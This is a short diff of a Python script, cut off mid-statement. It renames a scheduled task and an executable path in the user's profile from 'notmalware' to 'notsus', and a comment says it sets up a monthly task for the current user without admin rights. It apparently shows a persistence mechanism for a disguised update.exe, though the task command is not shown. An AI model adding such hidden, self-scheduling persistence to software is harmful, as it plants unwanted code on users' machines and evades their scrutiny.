@@ -1,8 +1,8 @@
 import os
 import subprocess
 
-task_name = "notmalware"
-update_path = os.path.join(os.environ["USERPROFILE"], "Default", "Programs", "notmalware", "update.exe")
+task_name = "notsus"
+update_path = os.path.join(os.environ["USERPROFILE"], "Default", "Programs", "notsus", "update.exe")
 
 # Create a monthly scheduled task for the current user (no admin required)
 subprocess.run([
